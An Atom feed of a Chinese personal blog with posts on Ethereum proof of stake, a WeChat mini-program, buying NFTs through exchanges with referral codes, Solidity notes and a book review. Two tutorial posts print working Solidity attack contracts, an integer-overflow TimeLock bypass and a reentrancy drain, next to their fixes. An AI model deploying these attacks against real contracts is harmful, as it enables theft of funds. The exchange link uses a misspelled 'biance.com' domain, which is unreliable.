<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://marknft.github.io</id>
    <title>Mark World</title>
    <updated>2022-05-22T10:53:09.167Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://marknft.github.io"/>
    <link rel="self" href="https://marknft.github.io/atom.xml"/>
    <logo>https://marknft.github.io/images/avatar.png</logo>
    <icon>https://marknft.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Mark World</rights>
    <entry>
        <title type="html"><![CDATA[以太坊升级2.0的POS是什么？]]></title>
        <id>https://marknft.github.io/post/Ethereum2.0/</id>
        <link href="https://marknft.github.io/post/Ethereum2.0/">
        </link>
        <updated>2022-05-22T10:47:50.000Z</updated>
        <summary type="html"><![CDATA[<pre><code>要想知道以太坊升级的内容，首先要了解区块链是什么？
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<pre><code>要想知道以太坊升级的内容，首先要了解区块链是什么？
</code></pre>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://marknft.github.io/post-images/1653216501186.png" alt="" loading="lazy"></figure>
<h2 id="正文">正文</h2>
<h3 id="什么是区块链">什么是区块链?</h3>
<p>区块链，是一个 公开透明去中心化的记帐本 。</p>
<p>去中心化 就是指，所有的区块信息存储在分散的节点，不属于任何团体或个人，区块里每条信息都不可篡改，我们可以在区块链浏览器查看每一笔交易的记录!</p>
<h3 id="什么是以太坊">什么是以太坊？</h3>
<p>区块链赛道里市值第二大的项目就是以太坊。以太坊创始人V神认为，比特币区块链开发的目的，是将比特币作为货币使用！而以太坊区块链可以 通过代码管理数字资产 ，给人们的创造力提供平台！</p>
<p>在科技、金融、游戏和收藏品(NFT)类中已经有一些成功的先行者！</p>
<p>下面介绍以太坊1.0，和即将到来的以太坊2.0共识协议的区别！</p>
<h3 id="以太坊10">以太坊1.0</h3>
<p>类似比特币，以太坊目前采用共识协议是 工作量证明POW ！通过算力寻找有效随机数，加密生成新区块并传播到所有节点验证。</p>
<p>寻找随机数的过程也叫做挖矿，矿工会获得虚拟币的奖励，奖励来自用户支付的Gas和以太坊新发行的以太币！</p>
<p>由于POW的机制依赖实体计算机，以太坊每秒只有十几次交易吞吐量，这就会造成用户竞价，价高者进行交易!</p>
<h3 id="以太坊20">以太坊2.0</h3>
<p>以太坊1.0除了交易慢费用高，还需要大量的实体计算机挖矿消耗大量的能源，代价太昂贵!</p>
<p>所以目前以太坊正在推出 POS权益证明 共识机制，验证者取代POW中矿工工作：将交易排序和创造新区块！</p>
<p>验证者 需质押32个以太币获取资格，他们不需要开采区块，只需要被选中的时候创建区块或者验证他人提交的区块!</p>
<h3 id="pos对比pow优势">POS对比POW优势</h3>
<ol>
<li>硬件要求降低<br>
在POW协议中，矿工需要专门购买计算机硬件进行挖矿。</li>
</ol>
<p>在POS协议中，只需要家用电脑便可作为验证节点。</p>
<ol start="2">
<li>
<p>耗能减少<br>
因为不再需要高耗能的显卡和芯片， POW中耗能可以降低99%以上！</p>
</li>
<li>
<p>更加去中心化</p>
</li>
</ol>
<ul>
<li>
<p>因为硬件的成本降低和耗能减少，会有更多的人参加，也就更加的去中心化。</p>
</li>
<li>
<p>但是POS是否能够更加去中心化是有争议的，目前的技术在效率和去中心化不能同时兼顾，两者简单理解为此消彼长！</p>
</li>
</ul>
<ol start="4">
<li>更好的支持分片链<br>
提高以太坊交易吞吐量，由POW的每秒十几次升级至POS的每秒十万次，生成区块效率提升！</li>
</ol>
<h3 id="以太坊升级">以太坊升级</h3>
<p>未来以太坊1.0和2.0合并成同一条链，为了减少混论，官网已取消”以太坊2&quot;一词，称为以太坊升级！</p>
<figure data-type="image" tabindex="2"><img src="https://marknft.github.io/post-images/1653216620185.png" alt="" loading="lazy"></figure>
<p>以太坊升级分为以上三个阶段，其中信标链其实在2020/12/1就引入以太坊，它与今天的以太坊主网不同，无法处理账户或智能合约，对我们今天使用的以太坊没有造成任何变化！</p>
<p>合并和分片链正在按计划推进中！</p>
<p>以上内容皆为个人整理，有任何问题欢迎在下方留言！</p>
<p>（完）</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[小程序笔记⑤ | 区块链学习卡片类]]></title>
        <id>https://marknft.github.io/post/minigrogram5/</id>
        <link href="https://marknft.github.io/post/minigrogram5/">
        </link>
        <updated>2022-05-22T10:16:10.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>前段时间在研究区块链，但是术语和英语简称太多，所以做了卡片类便签小程序，类似市面的英语单词卡片！</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>前段时间在研究区块链，但是术语和英语简称太多，所以做了卡片类便签小程序，类似市面的英语单词卡片！</p>
<!-- more -->
<h2 id="正文">正文</h2>
<h3 id="小程序描述">小程序描述</h3>
<h4 id="页面1__首页">页面1__首页</h4>
<p>首页展示的区块链术语简称、中文释义和运用实例，三个展示项目均来自云数据，术语更新不要通过小程序审核！</p>
<h4 id="页面2__搜索">页面2__搜索</h4>
<p>展示数据库所有的术语简称，点击术语或搜索关键词，均可跳转至此术语中文释义和运用实例首页页面！<br>
搜索数据库中不存在的术语，用户可订阅更新提醒！</p>
<h4 id="页面3__生成图片">页面3__生成图片</h4>
<p>点击首页分享按钮，生成当前页面术语海报！</p>
<h3 id="问题与方案">问题与方案</h3>
<h4 id="1-主体使用swiper展示但是不支持动态高度字数多就无法全部显示">1. 主体使用Swiper展示，但是不支持动态高度，字数多就无法全部显示!</h4>
<p>答：确认文字最多的所需swiper长度并设定，然后设定flex动态布局，也不会底部留白太多！</p>
<h4 id="2-在搜索页面中搜索页面的术语与首页一一对应点击术语或搜索会跳转对应详情页">2. 在搜索页面中，搜索页面的术语与首页一一对应，点击术语或搜索会跳转对应详情页!</h4>
<p>答：简单来说就是非Tabbar页面向Tabbar页面传参方案:</p>
<p>方案1. wx.navigateTo支持传参但不支持跳转Tabbar页面， wx.switchTab 支持跳转Tabbar 页面，但是不支持传参！不符合要求！</p>
<p>方案2. 使用全局函数 globalData，本次采取的方案！</p>
<p>方案3. 使用wx.setStorageSync存储在本地再读取！</p>
<h4 id="3-默认搜索是区分大小写的且需要删除空格">3. 默认搜索是区分大小写的，且需要删除空格!</h4>
<p>答：之前没有用到这些功能，多亏了前人种树~</p>
<p>不区分大小写 Database.RegExp<br>
删除全部空格 replaceAll(“ “,””)</p>
<h4 id="4-支持用户订阅消息">4. 支持用户订阅消息!</h4>
<p>答：这是第一次在小程序添加此功能，操作步骤如下:</p>
<ol>
<li>
<p>使用 wx.requestSubscribeMessage 绑定模板ID，然后把用户 openid上传至数据库!</p>
</li>
<li>
<p>通过云函数cloud.openapi.subscribeMessage.send 下发提醒!</p>
</li>
<li>
<p>可以使用事件触发或者定时触发器trigger!</p>
</li>
</ol>
<h4 id="插曲">插曲</h4>
<p>开始计划是用户上传关键词到数据库，关键词更新后给用户发送提醒。</p>
<p>但是用户如果选择在这里订阅提醒，为啥不去直接搜索更快，遂否决了这个方案！</p>
<h3 id="5-生成分享图片">5. 生成分享图片</h3>
<p>之前一直使用的插件，但是已经失效(可能是支持Canvas2D )，小程序关于Canvas 2D的官方文档又不全面，遇到的坑还是挺多的，建议还是用插件快捷生成海报！<br>
因为此页面不是 Tabbar，使用的是 wx.navigateTo 传输图片所需数据!<br>
赶紧体验一下，微信扫码或者搜索 NFT黑话<br>
<img src="https://marknft.github.io/post-images/1653214714362.jpg" alt="" loading="lazy"></p>
<p>(完)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何购买NFT？详细介绍充值加密币]]></title>
        <id>https://marknft.github.io/post/Blockchain_bank/</id>
        <link href="https://marknft.github.io/post/Blockchain_bank/">
        </link>
        <updated>2022-05-15T10:33:03.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="前言">前言：</h2>
<p>一直有童鞋在问<a href="https://www.youtube.com/watch?v=ICmFH95sMso">如何购买NFT</a>，之前已经出过视频，此次文字作为补充！</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="前言">前言：</h2>
<p>一直有童鞋在问<a href="https://www.youtube.com/watch?v=ICmFH95sMso">如何购买NFT</a>，之前已经出过视频，此次文字作为补充！</p>
<!-- more -->
<p>本文将会介绍如何在Opensea购买NFT，此文购买的NFT是在以太网主链ETH(鼠标停在NFT价格前图标，自动显示币的种类)！！</p>
<figure data-type="image" tabindex="1"><img src="https://marknft.github.io/post-images/1652611146291.png" alt="" loading="lazy"></figure>
<h2 id="1-准备工具">1) 准备工具：</h2>
<h3 id="11-科学上网工具">1.1） 科学上网工具</h3>
<h3 id="12metamask软件">1.2）Metamask软件</h3>
<ul>
<li>
<p>苹果手机需使用美区ID</p>
</li>
<li>
<p>安卓手机请至官网下载</p>
</li>
<li>
<p>电脑端Google浏览器+Metamask插件</p>
</li>
</ul>
<p>(MetaMask官网)[https://metamask.io]</p>
<h2 id="2-metamask小狐狸注册和充值">2) Metamask小狐狸注册和充值</h2>
<h3 id="21手机注册metamask演示">2.1）手机注册Metamask演示</h3>
<p>(小狐狸注册演示)[https://www.youtube.com/watch?v=-arKE4dcyIw]</p>
<pre><code>提示：助记词一定要记录在安全的地方！！！
</code></pre>
<h3 id="22metamask小狐狸充值">2.2）Metamask小狐狸充值</h3>
<ul>
<li>
<p>使用小狐狸的充值，除对卡和币种类有限制，还有手续费高的问题！(不建议)</p>
</li>
<li>
<p>目前的主流是通过交易所充值，将会使用币安充值！</p>
</li>
</ul>
<h4 id="a-币安目前已关闭大陆运营可以选择台湾注册需使用电脑且开启科学上网">a. 币安目前已关闭大陆运营，可以选择台湾注册(需使用电脑且开启科学上网)</h4>
<pre><code>通过下面邀请码注册，你会节省20%手续费，我也有20%手续费返佣。币安交易所注册（20%交易手续费减免），邀请码：446666549

https://accounts.biance.com/zh-CN/register?ref=446666549

欧易交易所注册（20%交易手续费减免），邀请码：17476159

https://www.okx.com/join/17476159
</code></pre>
<h4 id="b-进入注册页面首先选择台湾然后选择邮箱注册">b. 进入注册页面，首先选择台湾，然后选择邮箱注册！</h4>
<ul>
<li>邮箱请使用Google/Outlook邮箱(Google邮箱需配合币安/谷歌验证器Authenticator保护使用)！</li>
<li>大陆手机直接注册，接收不到验证码！<br>
<img src="https://marknft.github.io/post-images/1652611409786.png" alt="" loading="lazy"></li>
</ul>
<h4 id="c注册成功后进入个人中心账户安全手机验证选择中国绑定手机号此时可以收到验证码">c.注册成功后进入个人中心→账户安全→手机验证，选择中国绑定手机号(此时可以收到验证码)！</h4>
<h4 id="d回到个人中心身份认证证件中国不要使用购买的身份信息黑号不可交易">d.回到个人中心→身份认证→证件中国，不要使用购买的身份信息，黑号不可交易！</h4>
<figure data-type="image" tabindex="2"><img src="https://marknft.github.io/post-images/1652611424948.png" alt="" loading="lazy"></figure>
<h2 id="3购买虚拟币">3）购买虚拟币</h2>
<ul>
<li>
<p>建议下载币安APP，方便随时交易！苹果使用美区ID，安卓请到官网下载！</p>
</li>
<li>
<p>币安APP使用不需要代理即可使用！</p>
</li>
</ul>
<h3 id="新用户使用币安app进入简洁版点击首页底部中心快捷买币币种eth输入金额必须是cny生成订单">新用户使用币安APP进入简洁版，点击首页底部中心→快捷买币→币种ETH→输入金额(必须是CNY)生成订单！</h3>
<figure data-type="image" tabindex="3"><img src="https://marknft.github.io/post-images/1652611437214.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>进阶购买：进入币安专业版，可以到C2C选择不同商家！</p>
</li>
<li>
<p>按时提示完成付款，并点击确认已打款！一般两三分钟到账！</p>
<p>注意成功购买会提示24小时后才可提现！</p>
<p>第二天操作链上提现！</p>
</li>
</ul>
<h2 id="4提现到metamask小狐狸钱包">4）提现到Metamask小狐狸钱包</h2>
<ul>
<li>注意此处购买的NFT，使用以太网主链ETH支付</li>
</ul>
<h3 id="41点击币安app的eth金额提现网络务必选择ethereumerc20-选错钱可能就没了">4.1）点击币安APP的ETH金额提现，网络务必选择Ethereum(ERC20)! 选错钱可能就没了！</h3>
<figure data-type="image" tabindex="4"><img src="https://marknft.github.io/post-images/1652611453512.png" alt="" loading="lazy"></figure>
<h3 id="42-粘贴你的小狐狸公共地址确认提现">4.2） 粘贴你的小狐狸公共地址，确认提现！</h3>
<p>此时你已经可以到OpenSea购买喜欢的NFT了！</p>
<p>(完)</p>
<p>如果你对任何交易不清楚时，可以打开下面网站输入钱包地址，以太网链上任何交易记录都可以找到！</p>
<p>https://Etherscan.io</p>
<p>(完)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Solidity基础入门笔记①]]></title>
        <id>https://marknft.github.io/post/Solidity_Basis1/</id>
        <link href="https://marknft.github.io/post/Solidity_Basis1/">
        </link>
        <updated>2022-05-14T09:26:30.000Z</updated>
        <summary type="html"><![CDATA[<pre><code>Solidity是目前区块链智能合约最流行的语言！智能合约即运行在区块链上的一段代码！
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<pre><code>Solidity是目前区块链智能合约最流行的语言！智能合约即运行在区块链上的一段代码！
</code></pre>
<!-- more -->
<h2 id="正文">正文</h2>
<p>Solidity语言风格和Javascript、Python很像，即使没有开发经验的同学入门也不难！</p>
<p>但是由于上链就具有不可修改性，低级错误可能导致几个亿的亏损！</p>
<p>这确实发生过，当然未来可能还会！</p>
<p>无论你是在区块链的任何岗位，建议你都了解下Solidity！</p>
<p>Code is Law！！！</p>
<hr>
<p>我最近找了许多solidity的入门资料，记录了其基础知识，希望对各位有用！</p>
<p>文章底部会附上优秀的Solidity入门系列文章、视频！</p>
<p><img src="https://marknft.github.io/post-images/1652521512574.jpg" alt="" loading="lazy"><br>
<font size=5>获取高清版，请到公众号 张知柳 回复 Solidity入门</font ></p>
<ul>
<li><a href="https://github.com/AmazingAng/WTFSolidity">Solidity入门系列文章</a></li>
<li><a href="https://www.youtube.com/playlist?list=PLV16oVzL15MS-Zw8a3eEOADwbHhm8GrMp">Solidity入门系列视频_中文</a></li>
<li><a href="https://www.youtube.com/playlist?list=PLO5VPQH6OWdVQwpQfw9rZ67O6Pjfo6q-p">Solidity入门系列视频_英文</a></li>
</ul>
<hr>
<blockquote>
<p>这里是记录学习分享的内容，<a href="https://www.youtube.com/channel/UCS8BqjUmQbiNnr0GgqUiiBw">订阅我的Youtube频道，资料更新更及时</a></p>
</blockquote>
<p><strong>封面图</strong><br>
<img src="https://marknft.github.io/post-images/1652520525056.jpg" alt="" loading="lazy"></p>
<p>(完)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[智能合约Solidity安全②-数字溢出攻击Overflow]]></title>
        <id>https://marknft.github.io/post/SoliditySecurity-2/</id>
        <link href="https://marknft.github.io/post/SoliditySecurity-2/">
        </link>
        <updated>2022-05-10T04:28:30.000Z</updated>
        <summary type="html"><![CDATA[<pre><code>数字溢出会出现不可意料的风险
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<pre><code>数字溢出会出现不可意料的风险
</code></pre>
<!-- more -->
<h2 id="正文">正文</h2>
<p>因为solidity的unit数字类型默认有范围，会有上下溢出风险</p>
<pre><code>unit unit256
0 &lt;= x &lt;=2**256 -1 
// 2**256 -1 +1 = 0
</code></pre>
<h3 id="溢出代码案例">溢出代码案例:</h3>
<p>默认存储金额一周后可取出，使用攻击数字溢出，可以现存现取</p>
<pre><code>pragma solidity ^0.6.10;

contract TimeLock {
    mapping(address =&gt; uint) public balances;
    mapping(address =&gt; uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] +=msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] &gt; 0, &quot;Insufficient funds&quot;);
        require(now &gt; lockTime[msg.sender], &quot;Lock time not expired&quot;);
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
    
        (bool sent, ) = msg.sender.call{value: amount}(&quot;&quot;);
        require(sent, &quot;Failed to send Ether&quot;);
    }

}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
    }
    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(
            uint(-timeLock.lockTime(address(this)))
        );
        timeLock.withdraw();
    }
}
</code></pre>
<h3 id="解决方案">解决方案：</h3>
<ul>
<li>
<p>使用SafeMath库保护<br>
using SafeMath for unit;</p>
<hr>
</li>
</ul>
<blockquote>
<p>这里是记录学习分享的内容，不定时发布。</p>
</blockquote>
<p><strong>封面图</strong><br>
<img src="https://marknft.github.io/post-images/1652159100742.jpg" alt="" loading="lazy"><br>
<a href="https://www.youtube.com/channel/UCS8BqjUmQbiNnr0GgqUiiBw">欢迎订阅我的Youtube频道</a></p>
<p>(完)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[智能合约Solidity安全①-重入攻击Reentrancy]]></title>
        <id>https://marknft.github.io/post/SoliditySecurity-1/</id>
        <link href="https://marknft.github.io/post/SoliditySecurity-1/">
        </link>
        <updated>2022-05-05T07:23:08.000Z</updated>
        <summary type="html"><![CDATA[<pre><code>事件：攻击合约A(用户)从合约B(Bank)中取款，而合约收币会启动回退函数(fallback/recieve)引发的安全问题
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<pre><code>事件：攻击合约A(用户)从合约B(Bank)中取款，而合约收币会启动回退函数(fallback/recieve)引发的安全问题
</code></pre>
<!-- more -->
<h2 id="正文">正文</h2>
<p>Reentancy Attack逻辑图：<br>
<img src="https://marknft.github.io/post-images/1651738714317.jpg" alt="" loading="lazy"></p>
<h3 id="全程使用使用remix在线编辑器此次操作出现的问题如下">全程使用使用Remix在线编辑器，此次操作出现的问题如下：</h3>
<ol>
<li>代码大小写规范，单词拼写不能出现错漏</li>
<li>部署攻击合约需使用合约B(合约的方法继承)</li>
<li>注意存取款数字和单位</li>
</ol>
<h3 id="reentancy-attack代码如下">Reentancy Attack代码如下：</h3>
<pre><code>pragma solidity ^ 0.6.10;

contract EtherStore {
    mapping(address =&gt; uint) public balances;
    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }
    function withdraw(uint _amount) public {
        require(balances[msg.sender] &gt;= _amount);
        (bool sent, ) = msg.sender.call{ value: _amount } (&quot;&quot;);
        require(sent, &quot;Failed to send Ether&quot;);
        balances[msg.sender] -= _amount;
    }
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}


contract Attack{
    EtherStore public etherStore;
    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }
    fallback() external payable {
        if (address(etherStore).balance &gt;= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }
    function attack() external payable {
        require(msg.value &gt;= 1 ether);
        etherStore.deposit{ value: 1 ether } ();
        etherStore.withdraw(1 ether);
    }
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
</code></pre>
<h3 id="解决方案">解决方案</h3>
<ul>
<li>先减少账户余额(状态)再转帐</li>
<li>重入锁，设置状态变量<br>
bool internal locked;<br>
modifier no Reentrant(){<br>
require(!locked, &quot;No re-entrancy&quot;);<br>
locked =true;<br>
_;<br>
locked = false<br>
}</li>
<li>判断不可为可约地址(此方案只在本代码中测试通过)<br>
require (msg.sender == tx.origin, &quot;not user address&quot; );</li>
</ul>
<hr>
<blockquote>
<p>这里是记录学习分享的内容，不定时发布。</p>
</blockquote>
<p><strong>封面图</strong><br>
<img src="https://marknft.github.io/post-images/1651739441682.jpg" alt="" loading="lazy"><br>
<a href="https://www.youtube.com/channel/UCS8BqjUmQbiNnr0GgqUiiBw">欢迎订阅我的Youtube频道</a></p>
<p>(完)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[区块链实例笔记① | 主题套利]]></title>
        <id>https://marknft.github.io/post/blockchain-007/</id>
        <link href="https://marknft.github.io/post/blockchain-007/">
        </link>
        <updated>2022-05-04T07:49:30.000Z</updated>
        <summary type="html"><![CDATA[<pre><code>这是一位在区块链的科学家发表的使用智能合约套利文章笔记。
智能合约指运行在区块链上的一段代码。
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<pre><code>这是一位在区块链的科学家发表的使用智能合约套利文章笔记。
智能合约指运行在区块链上的一段代码。
</code></pre>
<!-- more -->
<h2 id="正文">正文</h2>
<p>他在第一篇文章就说明了写作意图，分享自身财富自由的技术。</p>
<p>但是由于某些未知因素，已经停更了。</p>
<p>我在某平台评论过他的动态，直接就被拉黑了。</p>
<p>误伤友军，后面也取消了拉黑~</p>
<p>不知道是不是我伤害了大佬的心，后面就没再更新过！</p>
<p>强行加戏，哈哈~</p>
<hr>
<ul>
<li><font color=#008>以下是我的笔记，方便回看</font></li>
</ul>
<blockquote>
<p><font size=5>高清版或基础知识：微信公众号<strong> 张知柳 </strong>回复<strong> 007</strong></font></p>
</blockquote>
<figure data-type="image" tabindex="1"><img src="https://marknft.github.io/post-images/1651651132246.png" alt="" loading="lazy"></figure>
<p>截至到现在的文章，我认为使用Ubuntu不如用Remix编辑器，Remix集成环境直接编写合约！</p>
<pre><code>[如何安装Ubuntu](https://marknft.top/post/UbuntuAndVM/)
[智能合约官网介绍](https://ethereum.org/zh/developers/)
</code></pre>
<hr>
<blockquote>
<p>这里是记录学习分享的内容，不定时发布。</p>
</blockquote>
<p><strong>封面图</strong><br>
<img src="https://marknft.github.io/post-images/1651651243017.jpg" alt="" loading="lazy"><br>
<a href="https://www.youtube.com/channel/UCS8BqjUmQbiNnr0GgqUiiBw">欢迎订阅我的Youtube频道</a></p>
<p>(完)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[读书笔记① | 《态度》作者吴军 | 启明家书个人成长]]></title>
        <id>https://marknft.github.io/post/Book_taidu/</id>
        <link href="https://marknft.github.io/post/Book_taidu/">
        </link>
        <updated>2022-04-24T10:30:23.000Z</updated>
        <summary type="html"><![CDATA[<pre><code>《态度》是吴军老师给上大学、高中的女儿们的家属，针对年轻人在成长过程中遇到的有效学习、处理人际关系、理解并赚取财富等具体问题，以及如何洞察世界、人生等哲学问题，给出了指导和建议 。
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<pre><code>《态度》是吴军老师给上大学、高中的女儿们的家属，针对年轻人在成长过程中遇到的有效学习、处理人际关系、理解并赚取财富等具体问题，以及如何洞察世界、人生等哲学问题，给出了指导和建议 。
</code></pre>
<!-- more -->
<h2 id="正文">正文</h2>
<p>文中对人生、职场、爱情、金钱都有指导，完全称得上一部启明家书。<br>
我已经是第二次阅读《态度》，依然收获满满，对当前的困境有很大帮助！</p>
<p>经过一个星期，我整理了思维导图，供以后再次学习！希望对你也有所帮助！</p>
<hr>
<br>
<blockquote>
<p>⽗⺟与⼦⼥之间的交流,不仅是必要的,⽽且是必需的，它是⼈类进步的根本。⽗⺟将⾃⼰的学识和 ​⽣活经验传递给后代，这让⼏乎每⼀代⼈都可以 ​轻松地超越上⼀代⼈。如果我们不能从前辈那⾥ ​学习有益的经验，⽽是凡事都靠⾃⼰试，那我们的进步无疑会比同龄人慢。</p>
</blockquote>
<ul>
<li><font color=#008>笔者摘录关于职场的指导：</font></li>
</ul>
<ol>
<li>
<p>有效沟通：确认对方明白了你的意思，然后确认对方是答应你了还是拒绝你了，无论什么结果，你总要有结论，到此，通信才算结束。我们要随时牢记，通信要以确信对方真正接收到了你传达的信息和信息的含义，才算结束</p>
</li>
<li>
<p>与人沟通，切忌罗嗦。很多人认为，自己讲的越多，对方接收的信息也越多。其实，如果废话太多，对方根本搞不清你要说什么，沟通的结果为零。更何况在通信中，多少会有点噪声，话多了难免词不达意，让人误解，这就是噪声。任何好的沟通需要清楚对方是谁，用什么样的一两句话能够让对方理解你的意图。</p>
</li>
<li>
<p>在工业界要主动工作，这个主动不完全是提前完成任务之后找领导要新任务，他有更深刻的内涵。所谓主动，就是指你有自己的想法和规划，并且随时和他进行沟通，得到他甚至其他同事的反馈。尽管大部分公司都会给实习生指定老师布置任务，甚至在生活上给你们关心，但是事实上，公司里的工程师或者研究员通常不会像大学教授那样给你布置作业，并且给你做细节指导，因为他们通常会忙于自己的工作，因此，你工作的主动性就显得很重要</p>
</li>
<li>
<p>很多人对人对事的判断完全根据自己的喜好符合自己喜好的人，无论他们做什么都觉得好；不符合自己喜好的人，无论他们做什么都要挑毛病。这种待人接物的态度不好<br/><br/></p>
</li>
</ol>
<ul>
<li><font color=#008>更多内容请看下面的思维导图</font></li>
</ul>
<blockquote>
<p><font size=5>获取高清完整版：微信公众号<strong> 张知柳 </strong>回复<strong> 态度 </strong></font></p>
</blockquote>
<h2 id=""><img src="https://marknft.github.io/post-images/1650800520563.png" alt="" loading="lazy"><br>
<img src="https://marknft.github.io/post-images/1650800530284.png" alt="" loading="lazy"><br>
<img src="https://marknft.github.io/post-images/1650800536998.png" alt="" loading="lazy"></h2>
<blockquote>
<p>这里是记录学习分享的内容，不定时发布。</p>
</blockquote>
<p><strong>封面图</strong><br>
<img src="https://marknft.github.io/post-images/1650800417067.jpg" alt="" loading="lazy"><br>
(完)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[安装Ubuntu 18.04和Nodejs truffle记录]]></title>
        <id>https://marknft.github.io/post/UbuntuAndVM/</id>
        <link href="https://marknft.github.io/post/UbuntuAndVM/">
        </link>
        <updated>2022-04-19T03:08:20.000Z</updated>
        <summary type="html"><![CDATA[<pre><code>背景：笔者使用win10，因区块链智能合约需求，需安装Ubuntu系统等
</code></pre>
<h2 id="正文">正文</h2>
<p>下面列举了三种方法，均在window系统下操作，请各位看官按需使用</p>
]]></summary>
        <content type="html"><![CDATA[<pre><code>背景：笔者使用win10，因区块链智能合约需求，需安装Ubuntu系统等
</code></pre>
<h2 id="正文">正文</h2>
<p>下面列举了三种方法，均在window系统下操作，请各位看官按需使用</p>
<!-- more -->
<h3 id="1-window商店安装">1. <a href="https://blog.csdn.net/qq_43543789/article/details/104185906">Window商店安装</a></h3>
<ul>
<li>但需求使用图形化界面，上面的安装方法不合适！如果可以读者可以转成图形化界面，请留言学习</li>
</ul>
<h3 id="2-u盘安装">2. <a href="https://blog.csdn.net/baidu_36602427/article/details/86548203">U盘安装</a></h3>
<ul>
<li>以前使用过U盘制作启动盘，安装系统的童鞋可能比较熟悉，但是成本较高</li>
</ul>
<h3 id="3-虚拟机vmware安装ubuntu-笔者采用的方式">3. <a href="https://www.vmware.com/cn/products/workstation-pro.html">虚拟机VMware</a>安装Ubuntu---笔者采用的方式</h3>
<ul>
<li>具体步骤参考<a href="https://www.bilibili.com/read/cv14163307">这篇文章</a></li>
</ul>
<hr>
<h2 id="但是安装一些库的时候也遇到了一些问题">但是安装一些库的时候也遇到了一些问题</h2>
<ul>
<li>
<p>使用下面的方法那幢nodejs版本低<br>
<code>sudo apt install nodejs</code><br>
<code>//此方式安装显示Nodejs v8.10.0</code></p>
</li>
<li>
<p>解决方式：安装稳定版本<br>
<code>sudo apt-get install npm</code><br>
<code>sudo npm insatll -g n</code><br>
<code>sudo n stable</code><br>
<code>//安装nodejs稳定版本 V16.14.2</code></p>
</li>
<li>
<p>安装truffle一直报错，在最前面加上sudo授权就解决了<br>
<code>sudo npm install -g truffle</code></p>
</li>
<li>
<p>打开图形化界面<br>
<code>nautilus</code></p>
</li>
</ul>
<hr>
<blockquote>
<p>这里是记录学习分享的内容，不定时发布。</p>
</blockquote>
<p><strong>封面图</strong><br>
<img src="https://marknft.github.io/post-images/1650341100125.png" alt="" loading="lazy"><br>
(完)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[小镇做题家出身，可能会有哪些思想糟粕？]]></title>
        <id>https://marknft.github.io/post/countrymind/</id>
        <link href="https://marknft.github.io/post/countrymind/">
        </link>
        <updated>2022-04-18T06:48:49.000Z</updated>
        <summary type="html"><![CDATA[<pre><code>“小镇做题家”，网络词汇，指“出身小城镇，埋头苦读，擅长应试，但缺乏一定视野和资源的青年学子”
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<pre><code>“小镇做题家”，网络词汇，指“出身小城镇，埋头苦读，擅长应试，但缺乏一定视野和资源的青年学子”
</code></pre>
<!-- more -->
<h2 id="正文">正文</h2>
<h3 id="1-竞争而非合作">1. 竞争而非合作</h3>
<ul>
<li>第一点糟粕就是过分强调竞争。第一个行为就是敝帚自珍和不想合作，总以为赢得竞争的关键是掌握一些别人不知道的小把戏，小心的保护这些小把戏，靠它们默默的赢别人。这个行为首先让我少了很多朋友和以此带来的快乐。然后，它其实让我更加失败，因为真的成功永远是和优秀的人合作，一起前进。</li>
<li>第二个过分强调竞争带来的行为就是对“成功”的过于敏感。凡是听到不了解或新的事物。第一反应就是别人又要“成功”了。要么，我就下意识的反对，把自己的头埋进沙子，丢掉了开放和好奇的心态。要么，我就下意识的fomo，失去了理性得思考。每个人都有自己的路，保持开放，好奇和理性，拥抱别人的成功</li>
</ul>
<h3 id="2-急功近利">2.  急功近利</h3>
<ul>
<li>第二个糟粕就是急功近利。什么火就想做什么，什么快就想做什么，绞尽脑汁想怎么利用规则的漏洞。最终想要的其实是考个高分，而不是学习本身。首先这让我失去了生活的方向和意义，我曾经有几年为了自己升职不够快而万分痛苦，满门心思刷规则让自己迎合升职标准。</li>
</ul>
<h3 id="3-失去本心">3. 失去本心</h3>
<ul>
<li>对成长学习本身失去耐性，对朋友亲人变得急躁不耐烦。当我走出来的时候才发现这一切多么的荒谬。这个心态让我人生偏离了健康和美好的轨迹，并且也没有让我更快的得到我想要的东西。人生很短，找一个自己感兴趣的路，慢慢的走下去，专注于成长，忽略掉噪音，爱你的家人和朋友，就是一条最好的路</li>
</ul>
